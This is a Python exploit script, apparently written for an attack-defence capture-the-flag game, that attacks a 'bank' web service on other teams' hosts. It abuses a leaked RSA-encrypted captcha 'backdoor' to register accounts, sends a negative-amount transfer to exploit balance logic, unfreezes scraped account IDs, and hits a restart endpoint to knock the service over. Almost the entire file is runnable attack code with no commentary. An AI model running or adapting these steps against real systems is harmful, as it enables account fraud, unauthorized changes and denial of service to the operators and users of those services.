#!/usr/bin/env python3
import json
import random
import re
import string
import sys
import os.path
import requests


team_addr = sys.argv[1]
PORT = 6478
USERS = []


def read():
    global USERS
    if not os.path.isfile("bank__frozens.txt"):
        write("")
    res = filter(lambda x: len(x), open("bank__frozens.txt", "r").read().split('\n'))
    if res is not None:
        USERS = set(res)
    else:
        USERS = []


def write(new_users):
    with open("bank__frozens.txt", "a+") as w:
        w.write('\n'.join(new_users))


def registration():
    n = 135425594556511166274277409262045223449161974728966903830902336158012685566685056092375478899993291153482871266842449856261740331537154742810036084612763401876643268334272277742219885868304117059993532611501666375035889705305370452261157698536676400701093018423205591432064100374528497079954968607616709767379
    e = 65537

    login = generate_rand(16)
    password = generate_rand(16)

    cred = {}

    # for ta in ["7.1.{}.1".format(x) for x in range(1, 25)]:
    for ta in ["7.1.{}.1".format(x) for x in range(23, 24)]:
        s = requests.Session()
        r = s.get("http://{}:{}/index.php?register=page".format(ta, PORT))
        backdoor = re.findall(r'backdoor" value="(\d+)"', r.text)
        if len(backdoor):
            backdoor = int(backdoor[0])
        for i in range(1000, 99999):
            if pow(i, e, n) == backdoor:
                r = s.post("http://{}:{}/index.php".format(ta, PORT), data={
                    "on_register": "on",
                    "reg_login": login,
                    "password": password,
                    "repeat_password": password,
                    "captcha": i
                })
                cred[ta] = (login, password)
                print("Finished {} with {} code: {}:{}".format(ta, i, login, password))
                break
    with open("bank__creds.txt", "w") as w:
        w.write(json.dumps(cred))


def fast_reg():
    n = 135425594556511166274277409262045223449161974728966903830902336158012685566685056092375478899993291153482871266842449856261740331537154742810036084612763401876643268334272277742219885868304117059993532611501666375035889705305370452261157698536676400701093018423205591432064100374528497079954968607616709767379
    e = 65537

    login = generate_rand(16)
    password = generate_rand(16)

    s = requests.Session()
    r = s.get("http://{}:{}/index.php?register=page".format(team_addr, PORT))
    backdoor = re.findall(r'backdoor" value="(\d+)"', r.text)
    if len(backdoor):
        backdoor = int(backdoor[0])
    for i in range(1000, 99999):
        if pow(i, e, n) == backdoor:
            r = s.post("http://{}:{}/index.php".format(team_addr, PORT), data={
                "on_register": "on",
                "reg_login": login,
                "password": password,
                "repeat_password": password,
                "captcha": i
            })
            break
    return login, password


def generate_rand(N=16):
    return ''.join(random.choice(string.ascii_letters) for i in range(N))


def exploit_one():
    login, password = fast_reg()
    s = requests.Session()
    r = s.post("http://{}:{}/index.php".format(team_addr, PORT), data={
        "login": login,
        "password": password
    })
    r = s.post("http://{}:{}/index.php".format(team_addr, PORT), data={
        "on_transaction": "on",
        "id_receiver": 10000,
        "cash": -100000
    })
    openUser(s)


def openUser(s):
    # s = requests.Session()
    r = s.get("http://{}:{}/index.php?freeze=page".format(team_addr, PORT))
    result = re.findall(r'getText\((\d+)\)\;\'\>\S+<', r.text)
    with open("bank__frozens.txt", "a+") as w:
        for num in result:
            if num not in USERS:
                r = s.post("http://{}:{}/index.php".format(team_addr, PORT), {
                    "unfreeze_id": num
                })
                print(r.text)
                w.write(num + "\n")
                w.flush()


def podnasrat():
    s = requests.Session()
    r = s.get("http://{}:{}/index.php?restart=1".format(team_addr, PORT))


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# read()
# registration()
exploit_one()
podnasrat()
